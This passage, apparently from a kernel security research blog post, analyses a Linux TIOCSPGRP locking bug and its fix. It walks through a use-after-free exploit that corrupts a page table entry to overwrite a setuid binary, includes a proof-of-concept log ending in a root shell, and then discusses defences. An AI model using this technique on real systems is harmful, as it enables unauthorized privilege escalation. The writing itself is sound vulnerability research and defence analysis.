     put_pid(old_pid)&lt;br /&gt;    real_tty-&amp;gt;pgrp = get_pid(A)&lt;br /&gt;                                        real_tty-&amp;gt;pgrp = get_pid(B)&lt;br /&gt;    spin_unlock_irq(...)                spin_unlock_irq(...)&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;  ioctl(fd1, TIOCSPGRP, pid_A)        ioctl(fd2, TIOCSPGRP, pid_B)&lt;br /&gt;    spin_lock_irq(...)                  spin_lock_irq(...)&lt;br /&gt;    put_pid(old_pid)&lt;br /&gt;                                        put_pid(old_pid)&lt;br /&gt;                                        real_tty-&amp;gt;pgrp = get_pid(B)&lt;br /&gt;    real_tty-&amp;gt;pgrp = get_pid(A)&lt;br /&gt;    spin_unlock_irq(...)                spin_unlock_irq(...)&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In both cases, the refcount of the old &lt;code&gt;struct pid&lt;/code&gt; is decremented by 1 too much, and either A's or B's is incremented by 1 too much.&lt;/p&gt;&lt;p&gt;Once you understand the issue, &lt;a href="https://git.kernel.org/linus/54ffccbf053b"&gt;the fix&lt;/a&gt; seems relatively obvious:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;    if (session_of_pgrp(pgrp) != task_session(current))&lt;br /&gt;        goto out_unlock;&lt;br /&gt;    retval = 0;&lt;br /&gt;-   spin_lock_irq(&amp;amp;tty-&amp;gt;ctrl_lock);&lt;br /&gt;+   spin_lock_irq(&amp;amp;real_tty-&amp;gt;ctrl_lock);&lt;br /&gt;    put_pid(real_tty-&amp;gt;pgrp);&lt;br /&gt;    real_tty-&amp;gt;pgrp = get_pid(pgrp);&lt;br /&gt;-   spin_unlock_irq(&amp;amp;tty-&amp;gt;ctrl_lock);&lt;br /&gt;+   spin_unlock_irq(&amp;amp;real_tty-&amp;gt;ctrl_lock);&lt;br /&gt; out_unlock:&lt;br /&gt;    rcu_read_unlock();&lt;br /&gt;    return retval;&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h1&gt;Attack stages&lt;/h1&gt;&lt;p&gt;In this section, I will first walk through how my exploit works; afterwards I will discuss different defensive techniques that target these attack stages.&lt;/p&gt;&lt;h2&gt;Attack stage: Freeing the object with multiple dangling references&lt;/h2&gt;&lt;p&gt;This bug allows us to probabilistically skew the refcount of a &lt;code&gt;struct pid&lt;/code&gt; down, depending on which way the race happens: We can run colliding &lt;code&gt;TIOCSPGRP&lt;/code&gt; calls from two threads repeatedly, and from time to time that will mess up the refcount. But we don't immediately know how many times the refcount skew has actually happened.&lt;/p&gt;&lt;p&gt;What we'd really want as an attacker is a way to skew the refcount deterministically. We'll have to somehow compensate for our lack of information about whether the refcount was skewed successfully. We could try to somehow make the race deterministic (seems difficult), or after each attempt to skew the refcount assume that the race worked and run the rest of the exploit (since if we didn't skew the refcount, the initial memory corruption is gone, and nothing bad will happen), or we can attempt to find an information leak that lets us figure out the state of the reference count.&lt;/p&gt;&lt;p&gt;On typical desktop/server distributions, the following approach works (unreliably, depending on RAM size) for setting up a freed &lt;code&gt;struct pid&lt;/code&gt; with multiple dangling references:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Allocate a new &lt;code&gt;struct pid&lt;/code&gt; (by creating a new task).&lt;/li&gt;&lt;li&gt;Create a large number of references to it (by sending messages with &lt;code&gt;SCM_CREDENTIALS&lt;/code&gt; to unix domain sockets, and leaving those messages queued up).&lt;/li&gt;&lt;li&gt;Repeatedly trigger the &lt;code&gt;TIOCSPGRP&lt;/code&gt; race to skew the reference count downwards, with the number of attempts chosen such that we expect that the resulting refcount skew is bigger than the number of references we need for the rest of our attack, but smaller than the number of extra references we created.&lt;/li&gt;&lt;li&gt;Let the task owning the &lt;code&gt;pid&lt;/code&gt; exit and die, and wait for RCU (read-copy-update, a mechanism that involves delaying the freeing of some objects) to settle such that the task's reference to the &lt;code&gt;pid&lt;/code&gt; is gone. (Waiting for an RCU grace period from userspace is not a primitive that is intentionally exposed through the UAPI, but there are various ways userspace can do it - e.g. by testing when a released BPF program's memory is subtracted from memory accounting, or by abusing the &lt;code&gt;membarrier(MEMBARRIER_CMD_GLOBAL, ...)&lt;/code&gt; syscall after the kernel version where RCU flavors were unified.)&lt;/li&gt;&lt;li&gt;Create a new thread, and let that thread attempt to drop all the references we created.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Because the refcount is smaller at the start of step 5 than the number of references we are about to drop, the &lt;code&gt;pid&lt;/code&gt; will be freed at some point during step 5; the next attempt to drop a reference will cause a use-after-free:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;struct upid {&lt;br /&gt;        int nr;&lt;br /&gt;        struct pid_namespace *ns;&lt;br /&gt;};&lt;br /&gt;&lt;br /&gt;struct pid&lt;br /&gt;{&lt;br /&gt;        atomic_t count;&lt;br /&gt;        unsigned int level;&lt;br /&gt;        /* lists of tasks that use this pid */&lt;br /&gt;        struct hlist_head tasks[PIDTYPE_MAX];&lt;br /&gt;        struct rcu_head rcu;&lt;br /&gt;        struct upid numbers[1];&lt;br /&gt;};&lt;br /&gt;[...]&lt;br /&gt;void put_pid(struct pid *pid)&lt;br /&gt;{&lt;br /&gt;        struct pid_namespace *ns;&lt;br /&gt;&lt;br /&gt;        if (!pid)&lt;br /&gt;                return;&lt;br /&gt;&lt;br /&gt;        ns = pid-&amp;gt;numbers[pid-&amp;gt;level].ns;&lt;br /&gt;        if ((atomic_read(&amp;amp;pid-&amp;gt;count) == 1) ||&lt;br /&gt;             atomic_dec_and_test(&amp;amp;pid-&amp;gt;count)) {&lt;br /&gt;                kmem_cache_free(ns-&amp;gt;pid_cachep, pid);&lt;br /&gt;                put_pid_ns(ns);&lt;br /&gt;        }&lt;br /&gt;}&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When the object is freed, the SLUB allocator normally replaces the first 8 bytes (sidenote: a different position is chosen starting in 5.7, &lt;a href="https://outflux.net/blog/archives/2020/09/21/security-things-in-linux-v5-7/#v5.7-slub"&gt;see Kees' blog&lt;/a&gt;) of the freed object with an XOR-obfuscated freelist pointer; therefore, the &lt;code&gt;count&lt;/code&gt; and &lt;code&gt;level&lt;/code&gt; fields are now effectively random garbage. This means that the load from &lt;code&gt;pid-&amp;gt;numbers[pid-&amp;gt;level]&lt;/code&gt; will now be at some random offset from the &lt;code&gt;pid&lt;/code&gt;, in the range from zero to 64 GiB. As long as the machine doesn't have tons of RAM, this will likely cause a kernel segmentation fault. (Yes, I know, that's an absolutely gross and unreliable way to exploit this. It mostly works though, and I only noticed this issue when I already had the whole thing written, so I didn't really want to go back and change it... plus, did I mention that it mostly works?)&lt;/p&gt;&lt;p&gt;Linux in its default configuration, and the configuration shipped by most general-purpose distributions, attempts to fix up unexpected kernel page faults and other types of "oopses" by killing only the crashing thread. Therefore, this kernel page fault is actually useful for us as a signal: Once the thread has died, we know that the object has been freed, and can continue with the rest of the exploit.&lt;/p&gt;&lt;p&gt;If this code looked a bit differently and we were actually reaching a double-free, the SLUB allocator would also detect that and trigger a kernel oops (see &lt;code&gt;set_freepointer()&lt;/code&gt; for the &lt;code&gt;CONFIG_SLAB_FREELIST_HARDENED&lt;/code&gt; case).&lt;/p&gt;&lt;h2&gt;Discarded attack idea: Directly exploiting the UAF at the SLUB level&lt;/h2&gt;&lt;p&gt;On the Debian kernel I was looking at, a &lt;code&gt;struct pid&lt;/code&gt; in the initial namespace is allocated from the same &lt;code&gt;kmem_cache&lt;/code&gt; as &lt;code&gt;struct seq_file&lt;/code&gt; and &lt;code&gt;struct epitem&lt;/code&gt; - these three slabs have been merged into one by &lt;code&gt;find_mergeable()&lt;/code&gt; to reduce memory fragmentation, since their object sizes, alignment requirements, and flags match:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@deb10:/sys/kernel/slab# ls -l pid&lt;br /&gt;lrwxrwxrwx 1 root root 0 Feb  6 00:09 pid -&amp;gt; :A-0000128&lt;br /&gt;root@deb10:/sys/kernel/slab# ls -l | grep :A-0000128&lt;br /&gt;drwxr-xr-x 2 root root 0 Feb  6 00:09 :A-0000128&lt;br /&gt;lrwxrwxrwx 1 root root 0 Feb  6 00:09 eventpoll_epi -&amp;gt; :A-0000128&lt;br /&gt;lrwxrwxrwx 1 root root 0 Feb  6 00:09 pid -&amp;gt; :A-0000128&lt;br /&gt;lrwxrwxrwx 1 root root 0 Feb  6 00:09 seq_file -&amp;gt; :A-0000128&lt;br /&gt;root@deb10:/sys/kernel/slab# &lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A straightforward way to exploit a dangling reference to a SLUB object is to reallocate the object through the same &lt;code&gt;kmem_cache&lt;/code&gt; it came from, without ever letting the page reach the page allocator. To figure out whether it's easy to exploit this bug this way, I made a table listing which fields appear at each offset in these three data structures (using &lt;code&gt;pahole -E --hex -C &amp;lt;typename&amp;gt; &amp;lt;path to vmlinux debug info&amp;gt;&lt;/code&gt;):&lt;/p&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;offset&lt;/th&gt;&lt;th&gt;pid&lt;/th&gt;&lt;th&gt;eventpoll_epi / epitem &lt;strong&gt;(RCU-freed)&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;seq_file&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;0x00&lt;/td&gt;&lt;td&gt;count.counter (4) &lt;strong&gt;(CONTROL)&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;rbn.__rb_parent_color (8) &lt;strong&gt;(TARGET?)&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;buf (8) &lt;strong&gt;(TARGET?)&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x04&lt;/td&gt;&lt;td&gt;level (4)&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x08&lt;/td&gt;&lt;td&gt;tasks[PIDTYPE_PID] (8)&lt;/td&gt;&lt;td&gt;rbn.rb_right (8) / rcu.func (8)&lt;/td&gt;&lt;td&gt;size (8)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x10&lt;/td&gt;&lt;td&gt;tasks[PIDTYPE_TGID] (8)&lt;/td&gt;&lt;td&gt;rbn.rb_left (8)&lt;/td&gt;&lt;td&gt;from (8)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x18&lt;/td&gt;&lt;td&gt;tasks[PIDTYPE_PGID] (8)&lt;/td&gt;&lt;td&gt;rdllink.next (8)&lt;/td&gt;&lt;td&gt;count (8)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x20&lt;/td&gt;&lt;td&gt;tasks[PIDTYPE_SID] (8)&lt;/td&gt;&lt;td&gt;rdllink.prev (8)&lt;/td&gt;&lt;td&gt;pad_until (8)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x28&lt;/td&gt;&lt;td&gt;rcu.next (8)&lt;/td&gt;&lt;td&gt;next (8)&lt;/td&gt;&lt;td&gt;index (8)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x30&lt;/td&gt;&lt;td&gt;rcu.func (8)&lt;/td&gt;&lt;td&gt;ffd.file (8)&lt;/td&gt;&lt;td&gt;read_pos (8)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x38&lt;/td&gt;&lt;td&gt;numbers[0].nr (4)&lt;/td&gt;&lt;td&gt;ffd.fd (4)&lt;/td&gt;&lt;td&gt;version (8)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x3c&lt;/td&gt;&lt;td&gt;[hole] (4)&lt;/td&gt;&lt;td&gt;nwait (4)&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x40&lt;/td&gt;&lt;td&gt;numbers[0].ns (8)&lt;/td&gt;&lt;td&gt;pwqlist.next (8)&lt;/td&gt;&lt;td&gt;lock (0x20): counter (8)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x48&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;pwqlist.prev (8)&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x50&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;ep (8)&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x58&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;fllink.next (8)&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x60&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;fllink.prev (8)&lt;/td&gt;&lt;td&gt;op (8)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x68&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;ws (8)&lt;/td&gt;&lt;td&gt;poll_event (4)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x6c&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;[hole] (4)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x70&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;event.events (4)&lt;/td&gt;&lt;td&gt;file (8)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x74&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;event.data (8) &lt;strong&gt;(CONTROL)&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x78&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;private (8) &lt;strong&gt;(TARGET?)&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x7c&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x80&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;td&gt;---&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;In this case, reallocating the object as one of those three types didn't seem to me like a nice way forward (although it should be possible to exploit this somehow with some effort, e.g. by using &lt;code&gt;count.counter&lt;/code&gt; to corrupt the &lt;code&gt;buf&lt;/code&gt; field of &lt;code&gt;seq_file&lt;/code&gt;). Also, some systems might be using the &lt;code&gt;slab_nomerge&lt;/code&gt; kernel command line flag, which disables this merging behavior.&lt;/p&gt;&lt;p&gt;Another approach that I didn't look into here would have been to try to corrupt the obfuscated SLUB freelist pointer (obfuscation is implemented in &lt;code&gt;freelist_ptr()&lt;/code&gt;); but since that stores the pointer in big-endian, &lt;code&gt;count.counter&lt;/code&gt; would only effectively let us corrupt the more significant half of the pointer, which would probably be a pain to exploit.&lt;/p&gt;&lt;h2&gt;Attack stage: Freeing the object's page to the page allocator&lt;/h2&gt;&lt;p&gt;This section will refer to some internals of the SLUB allocator; if you aren't familiar with those, you may want to at least look at slides 2-4 and 13-14 of &lt;a href="https://events.static.linuxfound.org/sites/events/files/slides/slaballocators.pdf"&gt;Christoph Lameter's slab allocator overview talk from 2014&lt;/a&gt;. (Note that that talk covers three different allocators; the SLUB allocator is what most systems use nowadays.)&lt;/p&gt;&lt;p&gt;The alternative to exploiting the UAF at the SLUB allocator level is to flush the page out to the page allocator (also called the buddy allocator), which is the last level of dynamic memory allocation on Linux (once the system is far enough into the boot process that the memblock allocator is no longer used). From there, the page can theoretically end up in pretty much any context. We can flush the page out to the page allocator with the following steps:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Instruct the kernel to pin our task to a single CPU. Both SLUB and the page allocator use per-cpu structures; so if the kernel migrates us to a different CPU in the middle, we would fail.&lt;/li&gt;&lt;li&gt;Before allocating the victim &lt;code&gt;struct pid&lt;/code&gt; whose refcount will be corrupted, allocate a large number of objects to drain partially-free slab pages of all their unallocated objects. If the victim object (which will be allocated in step 5 below) landed in a page that is already partially used at this point, we wouldn't be able to free that page.&lt;/li&gt;&lt;li&gt;Allocate around &lt;code&gt;objs_per_slab * (1+cpu_partial)&lt;/code&gt; objects - in other words, a set of objects that completely fill at least &lt;code&gt;cpu_partial&lt;/code&gt; pages, where &lt;code&gt;cpu_partial&lt;/code&gt; is the maximum length of the "percpu partial list". Those newly allocated pages that are completely filled with objects are not referenced by SLUB's freelists at this point because SLUB only tracks pages with free objects on its freelists.&lt;/li&gt;&lt;li&gt;Fill &lt;code&gt;objs_per_slab-1&lt;/code&gt; more objects, such that at the end of this step, the "CPU slab" (the page from which allocations will be served first) will not contain anything other than free space and fresh allocations (created in this step).&lt;/li&gt;&lt;li&gt;Allocate the victim object (a &lt;code&gt;struct pid&lt;/code&gt;). The victim page (the page from which the victim object came) will usually be the CPU slab from step 4, but if step 4 completely filled the CPU slab, the victim page might also be a new, freshly allocated CPU slab.&lt;/li&gt;&lt;li&gt;Trigger the bug on the victim object to create an uncounted reference, and free the object.&lt;/li&gt;&lt;li&gt;Allocate &lt;code&gt;objs_per_slab+1&lt;/code&gt; more objects. After this, the victim page will be completely filled with allocations from steps 4 and 7, and it won't be the CPU slab anymore (because the last allocation can not have fit into the victim page).&lt;/li&gt;&lt;li&gt;Free all allocations from steps 4 and 7. This causes the victim page to become empty, but does &lt;em&gt;not&lt;/em&gt; free the page; the victim page is placed on the percpu partial list once a single object from that page has been freed, and then stays on that list.&lt;/li&gt;&lt;li&gt;Free one object per page from the allocations from step 3. This adds all these pages to the percpu partial list until it reaches the limit &lt;code&gt;cpu_partial&lt;/code&gt;, at which point it will be flushed: Pages containing some in-use objects are placed on SLUB's per-&lt;a href="https://man7.org/linux/man-pages/man7/numa.7.html"&gt;NUMA&lt;/a&gt;-node partial list, and pages that are completely empty are freed back to the page allocator. (We don't free &lt;em&gt;all&lt;/em&gt; allocations from step 3 because we only want the victim page to be freed to the page allocator.) Note that this step requires that every &lt;code&gt;objs_per_slab&lt;/code&gt;-th object the allocator gave us in step 3 is on a different page.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;When the page is given to the page allocator, we benefit from the page being order-0 (4 KiB, native page size): For order-0 pages, the page allocator has special freelists, one per CPU+zone+migratetype combination. Pages on these freelists are not normally accessed from other CPUs, and they don't immediately get combined with adjacent free pages to form higher-order free pages.&lt;/p&gt;&lt;p&gt;At this point we are able to perform use-after-free accesses to some offset inside the free victim page, using codepaths that interpret part of the victim page as a &lt;code&gt;struct pid&lt;/code&gt;. Note that at this point, we still don't know exactly at which offset inside the victim page the victim object is located.&lt;/p&gt;&lt;h2&gt;Attack stage: Reallocating the victim page as a pagetable&lt;/h2&gt;&lt;p&gt;At the point where the victim page has reached the page allocator's freelist, it's essentially game over - at this point, the page can be reused as anything in the system, giving us a broad range of options for exploitation. In my opinion, most defences that act after we've reached this point are fairly unreliable.&lt;/p&gt;&lt;p&gt;One type of allocation that is directly served from the page allocator and has nice properties for exploitation are page tables (which have also been &lt;a href="https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html"&gt;used to exploit Rowhammer&lt;/a&gt;). One way to abuse the ability to modify a page table would be to enable the read/write bit in a page table entry (PTE) that maps a file page to which we are only supposed to have read access - for example, this could be used to gain write access to part of a setuid binary's &lt;code&gt;.text&lt;/code&gt; segment and overwrite it with malicious code.&lt;/p&gt;&lt;p&gt;We don't know at which offset inside the victim page the victim object is located; but since a page table is effectively an array of 8-byte-aligned elements of size 8 and the victim object's alignment is a multiple of that, as long as we spray all elements of the victim array, we don't need to know the victim object's offset.&lt;/p&gt;&lt;p&gt;To allocate a page table full of PTEs mapping the same file page, we have to:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;prepare by setting up a 2MiB-aligned memory region (because each last-level page table describes 2MiB of virtual memory) containing single-page &lt;code&gt;mmap()&lt;/code&gt; mappings of the same file page (meaning each mapping corresponds to one PTE); then&lt;/li&gt;&lt;li&gt;trigger allocation of the page table and fill it with PTEs by reading from each mapping&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;code&gt;struct pid&lt;/code&gt; has the same alignment as a PTE, and it starts with a 32-bit refcount, so that refcount is guaranteed to overlap the first half of a PTE, which is 64-bit. Because X86 CPUs are little-endian, incrementing the refcount field in the freed &lt;code&gt;struct pid&lt;/code&gt; increments the least significant half of the PTE - so it effectively increments the PTE. (Except for the edge case where the least significant half is &lt;code&gt;0xffffffff&lt;/code&gt;, but that's not the case here.)&lt;/p&gt;&lt;pre&gt;&lt;code&gt;struct pid: count | level |   tasks[0]  |   tasks[1]  |   tasks[2]  | ... &lt;br /&gt;pagetable:       PTE      |     PTE     |     PTE     |     PTE     | ...&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Therefore we can increment one of the PTEs by repeatedly triggering &lt;code&gt;get_pid()&lt;/code&gt;, which tries to increment the refcount of the freed object. This can be turned into the ability to write to the file page as follows:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Increment the PTE by 0x42 to set the Read/Write bit and the Dirty bit. (If we didn't set the Dirty bit, the CPU would do it by itself when we write to the corresponding virtual address, so we could also just increment by 0x2 here.)&lt;/li&gt;&lt;li&gt;For each mapping, attempt to overwrite its contents with malicious data and ignore page faults. &lt;ul&gt;&lt;li&gt;This might throw spurious errors because of outdated TLB entries, but taking a page fault will automatically evict such TLB entries, so if we just attempt the write twice, this can't happen on the second write (modulo CPU migration, as mentioned above).&lt;/li&gt;&lt;li&gt;One easy way to ignore page faults is to let the kernel perform the memory write using &lt;code&gt;pread()&lt;/code&gt;, which will return &lt;code&gt;-EFAULT&lt;/code&gt; on fault.&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;If the kernel notices the Dirty bit later on, that might trigger writeback, which could crash the kernel if the mapping isn't set up for writing. Therefore, we have to reset the Dirty bit. We can't reliably decrement the PTE because &lt;code&gt;put_pid()&lt;/code&gt; inefficiently accesses &lt;code&gt;pid-&amp;gt;numbers[pid-&amp;gt;level]&lt;/code&gt; even when the refcount isn't dropping to zero, but we can increment it by an additional 0x80-0x42=0x3e, which means the final value of the PTE, compared to the initial value, will just have the additional bit 0x80 set, which the kernel ignores.&lt;/p&gt;&lt;p&gt;Afterwards, we launch the setuid executable (which, in the version in the pagecache, now contains the code we injected), and gain root privileges:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;user@deb10:~/tiocspgrp$ make&lt;br /&gt;as -o rootshell.o rootshell.S&lt;br /&gt;ld -o rootshell rootshell.o --nmagic&lt;br /&gt;gcc -Wall -o poc poc.c&lt;br /&gt;user@deb10:~/tiocspgrp$ ./poc&lt;br /&gt;starting up...&lt;br /&gt;executing in first level child process, setting up session and PTY pair...&lt;br /&gt;setting up unix sockets for ucreds spam...&lt;br /&gt;draining pcpu and node partial pages&lt;br /&gt;preparing for flushing pcpu partial pages&lt;br /&gt;launching child process&lt;br /&gt;child is 1448&lt;br /&gt;ucreds spam done, struct pid refcount should be lifted. starting to skew refcount...&lt;br /&gt;refcount should now be skewed, child exiting&lt;br /&gt;child exited cleanly&lt;br /&gt;waiting for RCU call...&lt;br /&gt;bpf load with rlim 0x0: -1 (Operation not permitted)&lt;br /&gt;bpf load with rlim 0x1000: 452 (Success)&lt;br /&gt;bpf load success with rlim 0x1000: got fd 452&lt;br /&gtlt;br /&gt;RCU callbacks executed&lt;br /&gt;gonna try to free the pid...&lt;br /&gt;double-free child died with signal 9 after dropping 9990 references (99%)&lt;br /&gt;hopefully reallocated as an L1 pagetable now&lt;br /&gt;PTE forcibly marked WRITE | DIRTY (hopefully)&lt;br /&gt;clobber via corrupted PTE succeeded in page 0, 128-byte-allocation index 3, returned 856&lt;br /&gt;clobber via corrupted PTE succeeded in page 0, 128-byte-allocation index 3, returned 856&lt;br /&gt;bash: cannot set terminal process group (1447): Inappropriate ioctl for device&lt;br /&gt;bash: no job control in this shell&lt;br /&gt;root@deb10:/home/user/tiocspgrp# id&lt;br /&gt;uid=0(root) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),113(scanner),120(wireshark)&lt;br /&gt;root@deb10:/home/user/tiocspgrp# &lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that nothing in this whole exploit requires us to leak any kernel-virtual or physical addresses, partly because we have an increment primitive instead of a plain write; and it also doesn't involve directly influencing the instruction pointer.&lt;/p&gt;&lt;h1&gt;Defence&lt;/h1&gt;&lt;p&gt;This section describes different ways in which this exploit could perhaps have been prevented from working. To assist the reader, the titles of some of the subsections refer back to specific exploit stages from the section above.&lt;/p&gt;&lt;h2&gt;Against bugs being reachable: Attack surface reduction&lt;/h2&gt;&lt;p&gt;A potential first line of defense against many kernel security issues is to only make kernel subsystems available to code that needs access to them. If an attacker does not have direct access to a vulnerable subsystem &lt;em&gt;and&lt;/em&gt; doesn't have sufficient influence over a system component with access to make it trigger the issue, the issue is effectively unexploitable from the attacker's security context.&lt;/p&gt;&lt;p&gt;Pseudoterminals are (more or less) only necessary for interactively serving users who have shell access (or something resembling that), including:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;terminal emulators inside graphical user sessions&lt;/li&gt;&lt;li&gt;SSH servers&lt;/li&gt;&lt;li&gt;&lt;code&gt;screen&lt;/code&gt; sessions started from various types of terminals&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Things like webservers or phone apps won't normally need access to such devices; but there are exceptions. For example:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;a web server is used to provide a remote root shell for system administration&lt;/li&gt;&lt;li&gt;a phone app's purpose is to make a shell available to the user&lt;/li&gt;&lt;li&gt;a shell script uses &lt;code&gt;expect&lt;/code&gt; to interact with a binary that requires a terminal for input/output&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;In my opinion, the biggest limits on attack surface reduction as a defensive strategy are:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;It exposes a workaround to &lt;em&gt;an implementation concern&lt;/em&gt; of the kernel (potential memory safety issues) in user-facing API, which can lead to compatibility issues and maintenance overhead - for example, from a security standpoint, I think it might be a good idea to require phone apps and systemd services to declare their intention to use the PTY subsystem at install time, but that would be an API change requiring some sort of action from application authors, creating friction that wouldn't be necessary if we were confident that the kernel is working properly. This might get especially messy in the case of software that invokes external binaries depending on configuration, e.g. a web server that needs PTY access when it is used for server administration. (This is somewhat less complicated when a benign-but-potentially-exploitable application actively applies restrictions to itself; but not every application author is necessarily willing to design a fine-grained sandbox for their code, and even then, &lt;a href="https://lwn.net/Articles/738694/"&gt;there may be compatibility issues caused by libraries outside the application author's control&lt;/a&gt;.)&lt;/li&gt;&lt;li&gt;It can't protect a subsystem from a context that fundamentally needs access to it. (E.g. Android's &lt;code&gt;/dev/binder&lt;/code&gt; is directly accessible by Chrome renderers on Android because they have Android code running inside them.)&lt;/li&gt;&lt;li&gt;It means that decisions that ought to not influence the security of a system (making an API that does not grant extra privileges available to some potentially-untrusted context) essentially involve a security tradeoff.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Still, in practice, I believe that attack surface reduction mechanisms (especially seccomp) are currently some of the most important defense mechanisms on Linux.&lt;/p&gt;&lt;h2&gt;Against bugs in source code: Compile-time locking validation&lt;/h2&gt;&lt;p&gt;The bug in &lt;code&gt;TIOCSPGRP&lt;/code&gt; was a fairly straightforward violation of a straightforward locking rule: While a &lt;code&gt;tty_struct&lt;/code&gt; is live, accessing its &lt;code&gt;pgrp&lt;/code&gt; member is forbidden unless the &lt;code&gt;ctrl_lock&lt;/code&gt; of the same &lt;code&gt;tty_struct&lt;/code&gt; is held. This rule is sufficiently simple that it wouldn't be entirely unreasonable to expect the compiler to be able to verify it - as long as you somehow inform the compiler about this rule, because figuring out the intended locking rules just from looking at a piece of code can often be hard even for humans (especially when some of the code is incorrect).&lt;/p&gt;&lt;p&gt;When you are starting a new project from scratch, &lt;a href="https://alexgaynor.net/2019/aug/12/introduction-to-memory-unsafety-for-vps-of-engineering/"&gt;the overall best way to approach this is to use a memory-safe language&lt;/a&gt; - in other words, a language that has explicitly been designed such that the programmer has to provide the compiler with enough information about intended memory safety semantics that the compiler can automatically verify them. But for existing codebases, it might be worth looking into how much of this can be retrofitted.&lt;/p&gt;&lt;p&gt;Clang's &lt;a href="https://clang.llvm.org/docs/ThreadSafetyAnalysis.html"&gt;Thread Safety Analysis&lt;/a&gt; feature does something vaguely like what we'd need to verify the locking in this situation:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;$ nl -ba -s' ' thread-safety-test.cpp | sed 's|^   ||'&lt;br /&gt;  1 struct __attribute__((capability("mutex"))) mutex {&lt;br /&gt;  2 };&lt;br /&gt;  3 &lt;br /&gt;  4 void lock_mutex(struct mutex *p) __attribute__((acquire_capability(*p)));&lt;br /&gt;  5 void unlock_mutex(struct mutex *p) __attribute__((release_capability(*p)));&lt;br /&gt;  6 &lt;br /&gt;  7 struct foo {&lt;br /&gt;  8     int a 